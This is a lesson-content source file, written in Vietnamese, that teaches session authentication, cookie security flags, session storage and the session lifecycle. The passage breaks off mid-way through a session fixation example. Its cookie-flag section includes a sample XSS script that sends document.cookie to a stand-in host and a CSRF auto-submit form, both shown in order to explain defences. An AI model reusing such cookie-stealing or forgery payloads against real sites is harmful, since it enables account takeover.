/**
 * Session Authentication Lesson Content
 * Theme: KEYCARD PROTOCOL - Cyberpunk 2084
 */

export const sessionAuthContent = {
  storyHook: {
    title: "THẺ THANG MÁY",
    subtitle: "Session-Based Authentication",
    clearanceLevel: "Cơ Bản",
    status: "ĐANG HOẠT ĐỘNG",
    narrative: `Bạn đang vào một tòa chung cư cao cấp. Bảo vệ kiểm tra CMND của bạn, sau đó đưa cho bạn một thẻ từ.

Thẻ này cho phép bạn: vào thang máy, mở cửa phòng, sử dụng hồ bơi, và ra vào tòa nhà.
Thẻ có hiệu lực trong 24 giờ, sau đó bạn cần đổi thẻ mới.

Mất thẻ? Bạn bị khóa ngay lập tức - bảo vệ vô hiệu hóa thẻ trong hệ thống.
Ai đó ăn cắp thẻ? Họ có toàn quyền truy cập cho đến khi bạn báo mất.

Đó chính là cách **Session Authentication** hoạt động!`,
  },

  sections: [
    // ESSENTIAL SECTIONS
    {
      id: 'section-1',
      category: 'concepts',
      title: 'Session Auth Là Gì?',
      icon: 'Key',
      content: `### 🏦 Trong Cuộc Sống

**Ví dụ 1: Đi ngân hàng**

Bạn đến ngân hàng rút tiền. Nhân viên kiểm tra CMND và yêu cầu bạn ký vào phiếu giao dịch.
Sau đó, họ đưa cho bạn một "phiếu số thứ tự" - giả sử là số 42.

Mỗi lần bạn cần làm gì (rút tiền, chuyển khoản, kiểm tra số dư), bạn chỉ cần đưa phiếu số 42.
Nhân viên nhìn số, tra trong sổ sách: "À, số 42 là khách hàng Nguyễn Văn A, đã xác thực rồi"
→ Thực hiện giao dịch ngay.

Bạn không cần show CMND lại mỗi lần. Phiếu số 42 chính là **"session"** của bạn!

**Ví dụ 2: Đăng nhập Facebook**

Sáng nay bạn đăng nhập Facebook trên laptop. Suốt cả ngày, bạn xem newsfeed, like ảnh, comment -
nhưng Facebook KHÔNG bao giờ hỏi password lại.

Tại sao? Vì khi bạn đăng nhập lần đầu, Facebook đã tạo một "phiên làm việc" (session) và lưu
vào browser. Mỗi lần bạn click gì đó, browser tự động gửi session này kèm theo. Facebook biết:
"À, đây là bạn rồi" → Cho phép truy cập.

**Ví dụ 3: Netflix trên Smart TV**

Bạn đăng nhập Netflix trên Smart TV lúc 8 giờ tối. Xem phim xong, tắt TV đi ngủ.
Sáng hôm sau mở lại, vẫn đăng nhập sẵn - không cần nhập password lại.

Đó là nhờ session cookie - nó "nhớ" bạn trong 24-48 giờ (tùy cài đặt của Netflix).

### 🔍 Bản Chất Hoạt Động

Session Authentication hoạt động như thế này:

1. **Bạn đăng nhập** → Server kiểm tra username + password
2. **Server tạo "phiếu số"** → Một số ngẫu nhiên (ví dụ: abc123xyz)
3. **Server ghi sổ** → "Phiếu abc123xyz = User Nguyễn Văn A"
4. **Server đưa phiếu cho bạn** → Gửi về browser dưới dạng "cookie"
5. **Browser giữ phiếu** → Lưu cookie tự động
6. **Mỗi lần request** → Browser tự động gửi cookie kèm theo
7. **Server tra sổ** → "Phiếu abc123xyz à? Đây là Nguyễn Văn A" → OK!

**Điểm khác biệt với JWT**:
- **Session**: Server lưu thông tin, cookie chỉ chứa "số phiếu" (stateful)
- **JWT**: Token tự chứa thông tin, server chỉ verify chữ ký (stateless)

Giống như:
- **Session** = Thẻ thang máy (tòa nhà phải tra cứu database)
- **JWT** = Passport (nhân viên hải quan chỉ cần xem, không cần gọi điện về nước)

### 💻 Trong Lập Trình

Khi bạn code, session hoạt động như sau:

**Bước 1: User đăng nhập**
\`\`\`javascript
// User gửi: { username: "alice", password: "secret123" }
\`\`\`

**Bước 2: Server tạo session**
\`\`\`javascript
const sessionId = crypto.randomBytes(32).toString('hex'); // Tạo số ngẫu nhiên
// sessionId = "a1b2c3d4e5f6..." (64 ký tự)
\`\`\`

**Bước 3: Server lưu vào database**
\`\`\`javascript
database.sessions.create({
  id: "a1b2c3d4e5f6...",
  userId: 123,           // ID của user Alice
  createdAt: new Date(), // Thời điểm tạo
  expiresAt: new Date(Date.now() + 24*60*60*1000) // Hết hạn sau 24h
});
\`\`\`

**Bước 4: Server gửi cookie về browser**
\`\`\`javascript
response.cookie('sessionId', 'a1b2c3d4e5f6...', {
  httpOnly: true,    // JavaScript không đọc được (bảo mật!)
  secure: true,      // Chỉ gửi qua HTTPS
  maxAge: 86400000   // 24 giờ
});
\`\`\`

**Bước 5: Browser tự động gửi cookie mỗi request**
\`\`\`javascript
// Browser tự động thêm header:
// Cookie: sessionId=a1b2c3d4e5f6...
\`\`\`

**Bước 6: Server kiểm tra**
\`\`\`javascript
const sessionId = request.cookies.sessionId;
const session = database.sessions.findById(sessionId);

if (session && session.expiresAt > new Date()) {
  // Session hợp lệ → Cho phép truy cập
  const user = database.users.findById(session.userId);
  // Bây giờ biết user là ai rồi!
} else {
  // Session hết hạn hoặc không tồn tại → Yêu cầu đăng nhập lại
}
\`\`\`

### ⚠️ Điều Quan Trọng

**Ưu điểm**:
- ✅ Server kiểm soát hoàn toàn - muốn logout ai thì xóa session của họ
- ✅ Bảo mật cao - có thể thu hồi quyền truy cập ngay lập tức
- ✅ Phù hợp với web app truyền thống (Facebook, Gmail, Netflix)

**Nhược điểm**:
- ❌ Server phải lưu trữ session (tốn bộ nhớ/database)
- ❌ Khó scale ngang (nhiều server phải share session storage)
- ❌ Không phù hợp với mobile app (cookie không hoạt động tốt)

**Khi nào dùng Session Auth?**
- ✅ Website truyền thống (Facebook, Gmail, admin panel)
- ✅ Cần logout ngay lập tức (ngân hàng, healthcare)
- ✅ Bảo mật là ưu tiên số 1
- ❌ Mobile app → Nên dùng JWT
- ❌ Microservices → Nên dùng JWT`,
      keyPoints: [
        'Session = "phiếu số thứ tự" tại ngân hàng - server tra cứu để biết bạn là ai',
        'Cookie tự động gửi kèm mỗi request - bạn không cần làm gì',
        'Server lưu session trong database - kiểm soát hoàn toàn',
        'Logout = xóa session → hiệu lực ngay lập tức',
        'Phù hợp web app, không phù hợp mobile app'
      ],
      visual: 'So sánh: Thẻ ngân hàng (Session) ↔ Passport (JWT)',
    },
    {
      id: 'section-2',
      category: 'concepts',
      title: 'Quy Trình Đăng Nhập: 7 Bước Quan Trọng',
      icon: 'GitBranch',
      content: `### 📧 Ví Dụ: Đăng Nhập Gmail

Sáng nay bạn mở Gmail lần đầu. Hãy xem điều gì xảy ra từng bước một:

**Bước 1: Bạn nhập thông tin**
\`\`\`
Email: alice@gmail.com
Password: MySecretPass123
\`\`\`

**Bước 2: Gmail kiểm tra password**
- Gmail KHÔNG lưu password dạng text thuần
- Gmail lưu "hash" (mã hóa 1 chiều) của password
- Ví dụ: "MySecretPass123" → "$2a$10$N9qo8uLOickgx2ZMRZoMye..."
- Gmail so sánh hash → Đúng ✓

**Bước 3: Gmail tạo "phiếu số"**
\`\`\`javascript
// Gmail tạo số ngẫu nhiên siêu dài
sessionId = "a7f3b9d2e8c1f4a6b3d9e7c2f8a1b4d6..."
// 64 ký tự, không ai đoán được!
\`\`\`

**Bước 4: Gmail ghi sổ**
\`\`\`javascript
// Gmail lưu vào database
{
  sessionId: "a7f3b9d2e8c1...",
  userId: 12345,              // ID của alice@gmail.com
  createdAt: "2026-01-18 07:00:00",
  expiresAt: "2026-01-18 19:00:00"  // Hết hạn sau 12 giờ
}
\`\`\`

**Bước 5: Gmail gửi "phiếu" cho bạn**
\`\`\`javascript
// Gmail gửi cookie về browser
Set-Cookie: sessionId=a7f3b9d2e8c1...;
            HttpOnly;    // JavaScript không đọc được
            Secure;      // Chỉ gửi qua HTTPS
            SameSite=Strict;  // Chỉ gửi từ gmail.com
            Max-Age=43200     // 12 giờ
\`\`\`

**Bước 6: Browser tự động lưu**
- Browser nhận cookie
- Lưu vào bộ nhớ tự động
- Bạn không cần làm gì cả!

**Bước 7: Mỗi lần bạn làm gì đó**
\`\`\`
Bạn: Click "Compose" để viết email
Browser: Tự động gửi cookie kèm request
Gmail: Nhận cookie → Tra database → "À, đây là Alice" → OK!
\`\`\`

### 🔄 Quy Trình Chi Tiết

\`\`\`
┌─────────────┐                    ┌─────────────┐
│   Browser   │                    │   Server    │
│  (Bạn)      │                    │  (Gmail)    │
└─────────────┘                    └─────────────┘
       │                                   │
       │  1. POST /login                   │
       │  { email, password }              │
       │──────────────────────────────────▶│
       │                                   │
       │                          2. Kiểm tra password
       │                          bcrypt.compare()
       │                                   │
       │                          3. Tạo Session ID
       │                          crypto.randomBytes(32)
       │                                   │
       │                          4. Lưu vào Database
       │                          sessions.create()
       │                                   │
       │  5. Set-Cookie: sessionId=...     │
       │◀──────────────────────────────────│
       │                                   │
  6. Browser lưu cookie tự động
       │                                   │
       │  7. GET /inbox                    │
       │  Cookie: sessionId=...            │
       │──────────────────────────────────▶│
       │                                   │
       │                          8. Tra database
       │                          sessions.findById()
       │                                   │
       │  9. Response: Inbox data          │
       │◀──────────────────────────────────│
       │                                   │
\`\`\`

### ⚠️ Tại Sao Mỗi Bước Quan Trọng?

**Bước 2: Hash password**
- ❌ Lưu "MySecretPass123" → Hacker hack database thấy password
- ✅ Lưu "$2a$10$N9qo..." → Hacker không thể đảo ngược ra password

**Bước 3: Random session ID**
- ❌ Dùng \`Math.random()\` → Hacker đoán được
- ✅ Dùng \`crypto.randomBytes()\` → Không thể đoán (2^256 khả năng)

**Bước 4: Lưu server-side**
- ✅ Server kiểm soát hoàn toàn
- ✅ Muốn logout → Xóa session → Hiệu lực ngay lập tức

**Bước 5: HttpOnly cookie**
- ✅ JavaScript không đọc được
- ✅ Chặn XSS attack

**Bước 6: Browser tự động**
- ✅ Bạn không cần code gì
- ✅ Cookie tự động gửi kèm mỗi request

**Bước 7: Validate mỗi request**
- ✅ Mỗi request đều kiểm tra session
- ✅ Session hết hạn → Yêu cầu đăng nhập lại

### 💻 Code Ví Dụ

**Server (Node.js/Express)**:
\`\`\`javascript
// Bước 1-5: Login endpoint
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Bước 2: Kiểm tra password
  const user = await db.users.findOne({ email });
  const isValid = await bcrypt.compare(password, user.passwordHash);

  if (!isValid) {
    return res.status(401).json({ error: 'Sai password!' });
  }

  // Bước 3: Tạo session ID
  const sessionId = crypto.randomBytes(32).toString('hex');

  // Bước 4: Lưu vào database
  await db.sessions.create({
    id: sessionId,
    userId: user.id,
    expiresAt: new Date(Date.now() + 12*60*60*1000) // 12 giờ
  });

  // Bước 5: Gửi cookie
  res.cookie('sessionId', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 12*60*60*1000
  });

  res.json({ success: true, user: { email: user.email } });
});

// Bước 7-9: Middleware kiểm tra session
async function requireAuth(req, res, next) {
  const sessionId = req.cookies.sessionId;

  if (!sessionId) {
    return res.status(401).json({ error: 'Chưa đăng nhập!' });
  }

  // Bước 8: Tra database
  const session = await db.sessions.findById(sessionId);

  if (!session || session.expiresAt < new Date()) {
    return res.status(401).json({ error: 'Session hết hạn!' });
  }

  // Bước 9: Lấy thông tin user
  req.user = await db.users.findById(session.userId);
  next();
}

// Sử dụng middleware
app.get('/inbox', requireAuth, (req, res) => {
  // req.user đã có sẵn nhờ middleware
  res.json({ emails: [...] });
});
\`\`\`

### 🎯 Tóm Tắt

| Bước | Hành Động | Tại Sao Quan Trọng |
|------|-----------|-------------------|
| 1 | User gửi credentials | Xác thực danh tính |
| 2 | Server verify password hash | Bảo mật password |
| 3 | Tạo random session ID | Không thể đoán được |
| 4 | Lưu session vào database | Server kiểm soát |
| 5 | Gửi cookie về browser | HttpOnly = an toàn |
| 6 | Browser lưu tự động | Tiện lợi cho user |
| 7 | Validate mỗi request | Đảm bảo bảo mật |`,
      keyPoints: [
        'Bước 2: Hash password với bcrypt - KHÔNG BAO GIỜ lưu plain text',
        'Bước 3: crypto.randomBytes(32) - Không thể đoán được',
        'Bước 4: Lưu server-side - Kiểm soát hoàn toàn',
        'Bước 5: HttpOnly cookie - Chặn JavaScript đọc',
        'Bước 7: Validate mỗi request - Kiểm tra session còn hạn không'
      ],
      visual: 'Sơ đồ 7 bước: User → Browser → Server → Database',
    },
    {
      id: 'section-3',
      category: 'concepts',
      title: 'Bảo Mật Cookie: 4 Lá Chắn Quan Trọng',
      icon: 'Shield',
      content: `### ☕ Tình Huống Thực Tế

Bạn đang ngồi ở quán cà phê, dùng WiFi công cộng để check Facebook. Một hacker cũng đang ở quán,
đã cài script độc hại vào mạng WiFi.

**Kịch bản tấn công**:
1. Hacker chạy script đọc cookie Facebook của bạn
2. Hacker copy cookie vào browser của họ
3. Hacker mở Facebook → Đăng nhập thành công với tài khoản của bạn!
4. Hacker đọc tin nhắn, post bài, thậm chí đổi password

**Nhưng thực tế**: Facebook dùng cookie bảo mật → Hacker THẤT BẠI!

Tại sao? Vì Facebook set 4 cờ bảo mật cho cookie. Thiếu 1 cờ = lỗ hổng nghiêm trọng.

### 🛡️ 4 Lá Chắn Bảo Mật

#### 1. **HttpOnly** - Chặn JavaScript Đọc Cookie

**Vấn đề**: Script độc hại có thể đọc cookie qua \`document.cookie\`

**Giải pháp**: Set \`httpOnly: true\`

**Ví dụ tấn công BỊ CHẶN**:
\`\`\`javascript
// Hacker inject script này vào website
<script>
  // Cố gắng đọc cookie
  const cookie = document.cookie;
  // Gửi về server của hacker
  fetch('https://hacker.com/steal?cookie=' + cookie);
</script>

// KẾT QUẢ: document.cookie = "" (rỗng!)
// Cookie có HttpOnly không thể đọc được → Hacker thất bại ✓
\`\`\`

**Trong thực tế**:
- ✅ Facebook, Gmail, Netflix đều dùng HttpOnly
- ❌ Nếu không dùng → XSS attack thành công 100%

#### 2. **Secure** - Chỉ Gửi Qua HTTPS

**Vấn đề**: Cookie gửi qua HTTP (không mã hóa) → Hacker nghe lén mạng WiFi

**Giải pháp**: Set \`secure: true\` → Cookie chỉ gửi qua HTTPS

**Ví dụ**:
\`\`\`javascript
// Bạn truy cập: http://example.com (HTTP - không an toàn)
// Cookie KHÔNG được gửi → Bạn phải đăng nhập lại

// Bạn truy cập: https://example.com (HTTPS - an toàn)
// Cookie được gửi → Đăng nhập tự động ✓
\`\`\`

**Tại sao quan trọng?**:
- HTTP = gửi dữ liệu dạng text thuần → Hacker đọc được
- HTTPS = mã hóa dữ liệu → Hacker chỉ thấy ký tự loạn xạ

**Ví dụ thực tế**:
- Bạn dùng WiFi quán cà phê
- Hacker chạy Wireshark (công cụ nghe lén mạng)
- NẾU cookie không có Secure → Hacker thấy: \`sessionId=abc123xyz\`
- NẾU cookie có Secure → Hacker thấy: \`�%$#@!*&\` (gibberish)

#### 3. **SameSite=Strict** - Chặn CSRF Attack

**Vấn đề**: Website độc hại gửi request đến Facebook kèm cookie của bạn

**Giải pháp**: Set \`sameSite: 'strict'\` → Cookie chỉ gửi từ cùng domain

**Ví dụ tấn công**:
\`\`\`html
<!-- Hacker tạo website: evil.com -->
<form action="https://facebook.com/post" method="POST">
  <input name="message" value="Tôi bị hack rồi!" />
</form>
<script>
  // Tự động submit form
  document.forms[0].submit();
</script>

<!-- KẾT QUẢ -->
<!-- NẾU không có SameSite: Cookie Facebook được gửi → Post thành công -->
<!-- NẾU có SameSite=Strict: Cookie KHÔNG được gửi → Post thất bại ✓ -->
\`\`\`

**Trong cuộc sống**:
- Bạn đang đăng nhập Facebook
- Bạn click vào link lạ: evil.com
- evil.com cố gắng post bài lên Facebook của bạn
- SameSite=Strict chặn → Cookie không được gửi → Thất bại!

#### 4. **MaxAge** - Giới Hạn Thời Gian Sống

**Vấn đề**: Cookie sống mãi mãi → Nếu bị đánh cắp, hacker dùng mãi

**Giải pháp**: Set \`maxAge\` (thời gian sống tính bằng giây)

**Ví dụ**:
\`\`\`javascript
// Ngân hàng: 15 phút (900 giây)
maxAge: 15 * 60  // 900 giây

// Facebook: 2 tuần (1,209,600 giây)
maxAge: 14 * 24 * 60 * 60  // 1,209,600 giây

// Netflix: 30 ngày
maxAge: 30 * 24 * 60 * 60  // 2,592,000 giây
\`\`\`

**Tại sao quan trọng?**:
- Session bị đánh cắp → Hacker chỉ dùng được trong thời gian MaxAge
- MaxAge ngắn = cửa sổ tấn công nhỏ
- MaxAge dài = tiện lợi nhưng rủi ro cao

**Thực tế**:
- Ngân hàng: 15-30 phút (bảo mật tối đa)
- Admin panel: 1-2 giờ
- Mạng xã hội: 1-2 tuần (UX tốt hơn)
- Streaming: 30 ngày (không cần đăng nhập lại)

### 📋 Tóm Tắt

| Cờ Bảo Mật | Chặn Loại Tấn Công | Ví Dụ Thực Tế |
|-------------|---------------------|----------------|
| **HttpOnly** | XSS (Cross-Site Scripting) | Script độc không đọc được cookie |
| **Secure** | Network Sniffing | Hacker nghe lén WiFi không thấy cookie |
| **SameSite** | CSRF (Cross-Site Request Forgery) | Website độc không gửi được request kèm cookie |
| **MaxAge** | Stolen Cookie Reuse | Cookie hết hạn sau X giờ |

**Quy tắc vàng**: LUÔN LUÔN set cả 4 cờ! Thiếu 1 cờ = lỗ hổng bảo mật nghiêm trọng.`,
      keyPoints: [
        'HttpOnly: JavaScript không đọc được → Chặn XSS',
        'Secure: Chỉ gửi qua HTTPS → Chặn network sniffing',
        'SameSite=Strict: Chỉ gửi từ cùng domain → Chặn CSRF',
        'MaxAge: Giới hạn thời gian sống → Giảm thiểu thiệt hại nếu bị đánh cắp',
        'Thiếu 1 trong 4 cờ = lỗ hổng bảo mật nghiêm trọng'
      ],
      visual: 'Bảng so sánh: Cờ bảo mật | Loại tấn công | Ví dụ thực tế',
      codeExamples: {
        javascript: `// Express.js - Setting secure session cookie
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  const sessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: sessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000 // 30 minutes
  });

  res.cookie('sessionId', sessionId, {
    httpOnly: true,           // Prevents XSS
    secure: true,             // HTTPS only
    sameSite: 'strict',       // Prevents CSRF
    maxAge: 30 * 60 * 1000    // 30 minutes
  });

  res.json({ success: true, user: { id: user.id, email: user.email } });
});`,
        python: `# Flask - Setting secure session cookie
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)
    session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True, 'user': {'id': user.id, 'email': user.email}})
    response.set_cookie(
        'sessionId',
        session_id,
        httponly=True,        # Prevents XSS
        secure=True,          # HTTPS only
        samesite='Strict',    # Prevents CSRF
        max_age=1800          # 30 minutes
    )

    return response`,
        csharp: `// ASP.NET Core - Setting secure session cookie
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await VerifyCredentials(request);
    var sessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    await _db.Sessions.AddAsync(new Session
    {
        Id = sessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddMinutes(30)
    });
    await _db.SaveChangesAsync();

    Response.Cookies.Append("sessionId", sessionId, new CookieOptions
    {
        HttpOnly = true,         // Prevents XSS
        Secure = true,           // HTTPS only
        SameSite = SameSiteMode.Strict,  // Prevents CSRF
        MaxAge = TimeSpan.FromMinutes(30)
    });

    return Ok(new { success = true, user = new { id = user.Id, email = user.Email } });
}`,
        ruby: `# Rails - Setting secure session cookie
def login
  user = verify_credentials(params)
  session_id = SecureRandom.hex(32)

  Session.create!(
    id: session_id,
    user_id: user.id,
    expires_at: 30.minutes.from_now
  )

  cookies[:sessionId] = {
    value: session_id,
    httponly: true,      # Prevents XSS
    secure: true,        # HTTPS only
    same_site: :strict,  # Prevents CSRF
    expires: 30.minutes.from_now
  }

  render json: { success: true, user: { id: user.id, email: user.email } }
end`
      }
    },

    // IMPORTANT SECTIONS
    {
      id: 'section-4',
      category: 'system',
      title: 'Lưu Session Ở Đâu? 3 Lựa Chọn',
      icon: 'Database',
      content: `### 🏢 Tình Huống: Startup vs Enterprise

**Startup nhỏ (100 users)**:
- 1 server duy nhất
- Restart server 1 lần/tuần để update
- Budget hạn chế

**Enterprise lớn (1 triệu users)**:
- 50 servers chạy song song
- Không được phép downtime
- Cần scale liên tục

→ Mỗi trường hợp cần cách lưu session KHÁC NHAU!

### 💾 3 Cách Lưu Session

#### 1. **In-Memory (RAM)** - Lưu Trong Bộ Nhớ Server

**Cách hoạt động**:
\`\`\`javascript
// Session lưu trong biến JavaScript
const sessions = new Map();

sessions.set('abc123', {
  userId: 42,
  createdAt: new Date()
});
\`\`\`

**Ưu điểm**:
- ⚡ **Cực nhanh**: Đọc/ghi trong RAM (< 1ms)
- 🎯 **Đơn giản**: Không cần setup database
- 💰 **Miễn phí**: Không tốn tiền infrastructure

**Nhược điểm**:
- ❌ **Restart = mất hết**: Server restart → Tất cả users bị logout
- ❌ **Không scale ngang**: 2 servers không share session
- ❌ **Giới hạn RAM**: 1GB RAM = ~100,000 sessions

**Khi nào dùng**:
- ✅ Development/testing
- ✅ Startup nhỏ (< 1,000 users)
- ✅ Prototype/MVP
- ❌ Production với nhiều users
- ❌ Cần high availability

**Ví dụ thực tế**:
\`\`\`javascript
// Express.js với express-session
const session = require('express-session');

app.use(session({
  store: new MemoryStore(),  // Lưu trong RAM
  secret: 'my-secret',
  resave: false,
  saveUninitialized: false
}));

// Vấn đề: Server restart → Tất cả users logout!
\`\`\`

---

#### 2. **Database (PostgreSQL/MySQL)** - Lưu Trong Database

**Cách hoạt động**:
\`\`\`sql
-- Table sessions trong PostgreSQL
CREATE TABLE sessions (
  id VARCHAR(64) PRIMARY KEY,
  user_id INTEGER,
  data JSONB,
  expires_at TIMESTAMP
);

-- Mỗi request → Query database
SELECT * FROM sessions WHERE id = 'abc123';
\`\`\`

**Ưu điểm**:
- 💾 **Persistent**: Server restart → Session vẫn còn
- 🔄 **Multi-server**: Nhiều servers cùng dùng 1 database
- 🔍 **Query được**: Có thể tìm "sessions của user X"
- 📊 **Analytics**: Đếm số users online, thống kê

**Nhược điểm**:
- 🐌 **Chậm hơn RAM**: Disk I/O ~ 5-10ms (vs RAM < 1ms)
- 💰 **Tốn tiền**: Database hosting cost
- 🔧 **Phức tạp**: Cần setup, backup, maintenance

**Khi nào dùng**:
- ✅ Production app (1,000 - 100,000 users)
- ✅ Cần persistence (server restart OK)
- ✅ Multi-server setup
- ✅ Đã có database sẵn
- ❌ Cần tốc độ cực cao
- ❌ Hàng triệu users

**Ví dụ thực tế**:
\`\`\`javascript
// Express.js với PostgreSQL
const session = require('express-session');
const pgSession = require('connect-pg-simple')(session);

app.use(session({
  store: new pgSession({
    conString: 'postgres://localhost/mydb',
    tableName: 'sessions'
  }),
  secret: 'my-secret'
}));

// Lợi ích: Server restart → Users vẫn đăng nhập ✓
\`\`\`

---

#### 3. **Redis/Memcached** - In-Memory Database

**Cách hoạt động**:
\`\`\`javascript
// Redis = Database TRONG RAM
redis.set('session:abc123', JSON.stringify({
  userId: 42,
  createdAt: '2026-01-18'
}), 'EX', 3600);  // Tự động xóa sau 1 giờ

// Đọc siêu nhanh
const session = JSON.parse(redis.get('session:abc123'));
\`\`\`

**Ưu điểm**:
- ⚡ **Nhanh như RAM**: < 1ms latency
- 💾 **Persistent**: Có thể lưu vào disk
- 🔄 **Replication**: Master-slave, high availability
- 📈 **Scale ngang**: Redis Cluster cho hàng triệu users
- ⏰ **Auto-expire**: Tự động xóa session hết hạn

**Nhược điểm**:
- 💰 **Tốn tiền**: Redis hosting (AWS ElastiCache, Redis Cloud)
- 🔧 **Setup phức tạp**: Cần học Redis
- 🧠 **Giới hạn RAM**: Phải mua RAM đủ lớn

**Khi nào dùng**:
- ✅ Production app (> 10,000 users)
- ✅ Cần tốc độ cao + persistence
- ✅ Multi-server, microservices
- ✅ Budget cho infrastructure
- ✅ **Industry standard** (Facebook, Netflix, Twitter)

**Ví dụ thực tế**:
\`\`\`javascript
// Express.js với Redis
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const redisClient = redis.createClient({
  host: 'localhost',
  port: 6379
});

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: 'my-secret',
  resave: false,
  saveUninitialized: false
}));

// Best of both worlds: Nhanh + Persistent + Scalable ✓
\`\`\`

### 📊 So Sánh Chi Tiết

| Tiêu Chí | In-Memory | Database | Redis |
|----------|-----------|----------|-------|
| **Tốc độ** | ⚡⚡⚡ (< 1ms) | 🐌 (5-10ms) | ⚡⚡⚡ (< 1ms) |
| **Persistence** | ❌ Mất khi restart | ✅ Lưu vĩnh viễn | ✅ Có thể persist |
| **Multi-server** | ❌ Không share | ✅ Share qua DB | ✅ Share qua Redis |
| **Scale** | ❌ 1 server only | ⚠️ Giới hạn DB | ✅ Redis Cluster |
| **Cost** | 💰 Free | 💰💰 Medium | 💰💰💰 High |
| **Setup** | 🎯 Cực đơn giản | 🔧 Trung bình | 🔧🔧 Phức tạp |
| **Use Case** | Dev/Testing | Small-Medium | Large-Scale |

### 🎯 Quyết Định Nhanh

**Bạn đang làm gì?**

1. **Học lập trình / Prototype**
   → In-Memory (đơn giản nhất)

2. **Startup nhỏ (< 10,000 users)**
   → Database (PostgreSQL/MySQL)
   → Đã có database sẵn, tận dụng luôn

3. **App lớn (> 10,000 users)**
   → Redis
   → Industry standard, proven at scale

4. **Enterprise (hàng triệu users)**
   → Redis Cluster
   → Netflix, Facebook, Twitter đều dùng

### 💡 Lời Khuyên Thực Tế

**Bắt đầu đơn giản**:
\`\`\`
Phase 1 (MVP): In-Memory
  ↓ (có users)
Phase 2 (Growth): Database
  ↓ (nhiều users)
Phase 3 (Scale): Redis
\`\`\`

**Không cần Redis ngay từ đầu!**
- < 1,000 users → Database đủ rồi
- 1,000 - 10,000 users → Database + caching
- > 10,000 users → Cân nhắc Redis

**Ví dụ migration**:
\`\`\`javascript
// Bắt đầu với Database
let sessionStore = new PostgreSQLStore();

// Khi cần scale → Chuyển sang Redis
if (process.env.NODE_ENV === 'production') {
  sessionStore = new RedisStore();
}

app.use(session({ store: sessionStore }));
\`\`\``,
      keyPoints: [
        'In-Memory: Nhanh nhất nhưng mất khi restart - dùng cho dev/testing',
        'Database: Persistent, multi-server - dùng cho startup/medium apps',
        'Redis: Nhanh + Persistent + Scalable - industry standard cho production',
        'Bắt đầu đơn giản (Database), scale sau (Redis)',
        'Netflix, Facebook, Twitter đều dùng Redis cho sessions'
      ],
      visual: 'Bảng so sánh: In-Memory vs Database vs Redis',
    },
    {
      id: 'section-5',
      category: 'concepts',
      title: 'Vòng Đời Session: Từ Sinh Ra Đến Chết Đi',
      icon: 'RefreshCw',
      content: `### 📱 Ví Dụ: Một Ngày Với Facebook

**7:00 AM - Đăng nhập (Creation)**
- Bạn mở Facebook, nhập email + password
- Facebook tạo session mới: \`session_abc123\`
- Gửi cookie về browser, hết hạn lúc 7:00 PM (12 giờ)

**12:00 PM - Đang dùng (Refresh)**
- Bạn vẫn đang lướt Facebook, like ảnh, comment
- Facebook thấy bạn active → Gia hạn thêm 12 giờ
- Session giờ hết hạn lúc 12:00 AM (nửa đêm)

**3:00 PM - Nâng cấp quyền (Regeneration)**
- Bạn vào Settings → Đổi password
- Facebook TẠO SESSION MỚI: \`session_xyz789\`
- XÓA session cũ \`session_abc123\`
- Lý do: Bảo mật! (giải thích bên dưới)

**10:00 PM - Đăng xuất (Destruction)**
- Bạn click "Logout"
- Facebook XÓA session khỏi database
- Facebook XÓA cookie khỏi browser
- Bạn phải đăng nhập lại

### 🔄 4 Giai Đoạn Vòng Đời

#### 1. **Creation (Tạo Session)**

**Khi nào**: User đăng nhập thành công

**Điều gì xảy ra**:
\`\`\`javascript
// 1. Tạo ID ngẫu nhiên
const sessionId = crypto.randomBytes(32).toString('hex');
// → "a7f3b9d2e8c1f4a6b3d9e7c2f8a1b4d6..."

// 2. Lưu vào database
await db.sessions.create({
  id: sessionId,
  userId: user.id,
  createdAt: new Date(),
  expiresAt: new Date(Date.now() + 12*60*60*1000), // 12 giờ
  lastActivity: new Date()
});

// 3. Gửi cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  maxAge: 12*60*60*1000
});
\`\`\`

**Quy tắc vàng**: KHÔNG BAO GIỜ tái sử dụng session ID cũ!

---

#### 2. **Refresh (Gia Hạn Session)**

**Khi nào**: User đang active (click, scroll, type)

**Vấn đề**:
- Session hết hạn sau 30 phút
- User đang xem video dài 1 giờ
- Phút thứ 31 → Bị logout giữa chừng!

**Giải pháp - Sliding Expiration**:
\`\`\`javascript
// Middleware: Mỗi request → Gia hạn session
async function refreshSession(req, res, next) {
  const session = await db.sessions.findById(req.cookies.sessionId);

  if (session) {
    // Cập nhật lastActivity
    session.lastActivity = new Date();

    // Gia hạn thêm 30 phút
    session.expiresAt = new Date(Date.now() + 30*60*1000);

    await session.save();
  }

  next();
}

app.use(refreshSession);
\`\`\`

**Kết quả**:
- User active → Session tự động gia hạn
- User không active 30 phút → Logout (bảo mật)
- User xem video 2 giờ → Vẫn đăng nhập ✓

**Ví dụ thực tế**:
- **Gmail**: Gia hạn mỗi lần bạn đọc email
- **Netflix**: Gia hạn mỗi 5 phút khi xem phim
- **Ngân hàng**: KHÔNG gia hạn - timeout cứng 15 phút (bảo mật)

---

#### 3. **Regeneration (Tạo Lại Session ID)**

**Khi nào**: Sau khi thay đổi quyền/privilege

**Tình huống**:
1. User đăng nhập → Session: \`abc123\`
2. User đổi password
3. User nâng cấp lên admin
4. User enable 2FA

→ TẠO SESSION MỚI, XÓA SESSION CŨ!

**Tại sao quan trọng? Session Fixation Attack!**

**Kịch bản tấn công**:
\`\`\`
1. Hacker tạo session: session_HACKER_KNOWS
2. Hacker gửi link cho bạn:
   https://bank.com/login?sessionId=session_HACKER_KNOWS
3. Bạn click link, đăng nhập thành công
